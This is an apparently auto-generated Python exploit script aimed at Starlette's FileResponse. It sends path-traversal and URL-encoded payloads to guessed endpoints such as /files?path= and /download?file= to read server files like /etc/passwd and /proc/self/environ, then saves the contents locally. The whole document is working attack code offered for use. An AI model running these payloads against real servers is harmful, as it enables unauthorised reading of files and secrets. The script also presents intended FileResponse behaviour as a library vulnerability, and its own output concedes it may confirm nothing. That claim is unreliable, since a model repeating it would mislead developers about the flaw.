#!/usr/bin/env python3
# PoC for starlette (/home/xcy/.local/lib/python3.14/site-packages/starlette)
# Path: lfi-005
# Sink: _handle_simple
# Auto-generated — run with: python3 lfi_fileresponse_class_uses_self__handle_simple.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: Starlette FileResponse LFI (Path Traversal)
Vulnerability: FileResponse uses self.path directly in anyio.open_file() without validation.
Impact: Arbitrary file read on the server filesystem.
"""

import argparse
import sys
import requests
from urllib.parse import urljoin

def exploit(target_url, file_path="/etc/passwd"):
    """
    Attempt to read an arbitrary file via Starlette's FileResponse path traversal.
    
    The vulnerability exists because FileResponse._handle_simple() passes self.path
    directly to anyio.open_file() without sanitization. If an attacker can control
    the path parameter (e.g., via a crafted request), they can read any file.
    
    Args:
        target_url: Base URL of the vulnerable Starlette application
        file_path: Path to the file to read (default: /etc/passwd)
    """
    print(f"[*] Target: {target_url}")
    print(f"[*] Attempting to read: {file_path}")
    
    # The vulnerability is triggered when a request causes Starlette to create
    # a FileResponse with an attacker-controlled path. This typically happens
    # when the application uses FileResponse to serve files based on user input.
    
    # Common patterns where this might be exploitable:
    # 1. Direct file serving endpoints: /files?path=../../../etc/passwd
    # 2. Static file handlers that pass user input to FileResponse
    # 3. Redirect responses that include user-controlled paths
    
    # Try multiple common patterns
    payloads = [
        # Direct path parameter
        f"/files?path={file_path}",
        f"/download?file={file_path}",
        f"/static/{file_path}",
        # Path traversal in URL
        f"/../..{file_path}",
        # Encoded variants
        f"/files?path=%2e%2e%2f%2e%2e%2f{file_path.replace('/', '%2f')}",
    ]
    
    for payload in payloads:
        url = urljoin(target_url, payload)
        print(f"\n[*] Trying: {url}")
        
        try:
            response = requests.get(url, timeout=10, allow_redirects=False)
            
            # Check if we got a successful response with file content
            if response.status_code == 200 and len(response.content) > 0:
                # Check if the response looks like a file (not HTML/JSON)
                content_type = response.headers.get('Content-Type', '')
                if 'text' in content_type or 'application/octet-stream' in content_type or not content_type:
                    print(f"[+] SUCCESS! Status: {response.status_code}")
                    print(f"[+] Content-Type: {content_type}")
                    print(f"[+] Content length: {len(response.content)} bytes")
                    print(f"[+] File content preview:\n{response.text[:2000]}")
                    
                    # Save the file content
                    output_file = file_path.replace('/', '_').lstrip('_')
                    with open(f"lfi_output_{output_file}", 'wb') as f:
                        f.write(response.content)
                    print(f"[+] Saved to: lfi_output_{output_file}")
                    return True
                else:
                    print(f"[-] Got response but content type is {content_type}, might not be the file")
            elif response.status_code == 302 or response.status_code == 301:
                # Check redirect location for path leakage
                location = response.headers.get('Location', '')
                print(f"[*] Redirect to: {location}")
                if file_path in location:
                    print(f"[+] Path reflected in redirect: {location}")
            else:
                print(f"[-] Status: {response.status_code}, Length: {len(response.content)}")
                
        except requests.exceptions.ConnectionError:
            print(f"[-] Connection error - is the server running?")
        except requests.exceptions.Timeout:
            print(f"[-] Request timed out")
        except Exception as e:
            print(f"[-] Error: {e}")
    
    print("\n[*] No direct exploitation found with common patterns.")
    print("[*] The vulnerability requires a specific endpoint that passes user input to FileResponse.")
    print("[*] Try identifying endpoints that serve files dynamically.")
    return False

def main():
    parser = argparse.ArgumentParser(
        description="Starlette FileResponse LFI PoC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 poc.py http://localhost:8000
  python3 poc.py http://localhost:8000 -f /etc/passwd
  python3 poc.py http://localhost:8000 -f /proc/self/environ
        """
    )
    parser.add_argument("target", help="Target URL (e.g., http://localhost:8000)")
    parser.add_argument("-f", "--file", default="/etc/passwd",
                        help="File to read (default: /etc/passwd)")
    
    args = parser.parse_args()
    
    # Validate target URL
    if not args.target.startswith(("http://", "https://")):
        print("[-] Target must start with http:// or https://")
        sys.exit(1)
    
    # Remove trailing slash
    target = args.target.rstrip('/')
    
    print("=" * 60)
    print("Starlette FileResponse LFI Proof-of-Concept")
    print("=" * 60)
    print(f"[*] Target: {target}")
    print(f"[*] File to read: {args.file}")
    print()
    
    success = exploit(target, args.file)
    
    if success:
        print("\n[+] Vulnerability confirmed!")
    else:
        print("\n[-] Could not confirm vulnerability with tested payloads.")
        print("[*] The application may not expose a vulnerable endpoint.")
        print("[*] Manual testing may be required to find the vulnerable route.")

if __name__ == "__main__":
    main()
